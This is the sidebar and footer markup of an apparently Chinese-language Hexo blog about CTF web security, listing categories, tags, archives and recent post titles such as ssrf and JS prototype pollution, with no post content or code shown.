      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web/">CTF-web</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">php代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web/php%E5%AE%A1%E8%AE%A1/">php审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web/rce/">rce</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/">文件操作</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">环境搭建</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%89%BA%E6%9C%AF/">艺术</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%A9%E5%91%BD%E6%8B%82%E6%99%93/">革命拂晓</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/web-php/" rel="tag">web php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E5%AD%97%E6%84%9F%E6%82%9F/" rel="tag">文字感悟</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%8E%AF%E5%A2%83/" rel="tag">环境</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%87%AA%E5%B7%B1%E7%9A%84%E8%89%BA%E6%9C%AF/" rel="tag">自己的艺术</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/web-php/" style="font-size: 20px;">web php</a> <a href="/tags/%E6%96%87%E5%AD%97%E6%84%9F%E6%82%9F/" style="font-size: 10px;">文字感悟</a> <a href="/tags/%E7%8E%AF%E5%A2%83/" style="font-size: 15px;">环境</a> <a href="/tags/%E8%87%AA%E5%B7%B1%E7%9A%84%E8%89%BA%E6%9C%AF/" style="font-size: 10px;">自己的艺术</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/08/">August 2024</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2024/09/01/%E9%9A%90%E5%86%99%E7%B3%BB%E5%88%97/">隐写系列</a>
          </li>
        
          <li>
            <a href="/2024/09/01/%E8%84%9A%E6%9C%AC%E5%B7%A5%E5%85%B7/">脚本工具</a>
          </li>
        
          <li>
            <a href="/2024/09/01/ssrf/">ssrf</a>
          </li>
        
          <li>
            <a href="/2024/09/01/jwt%E7%AD%89%E8%AE%A4%E8%AF%81went/">jwt等认证went</a>
          </li>
        
          <li>
            <a href="/2024/09/01/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">js原型链污染</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2024 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>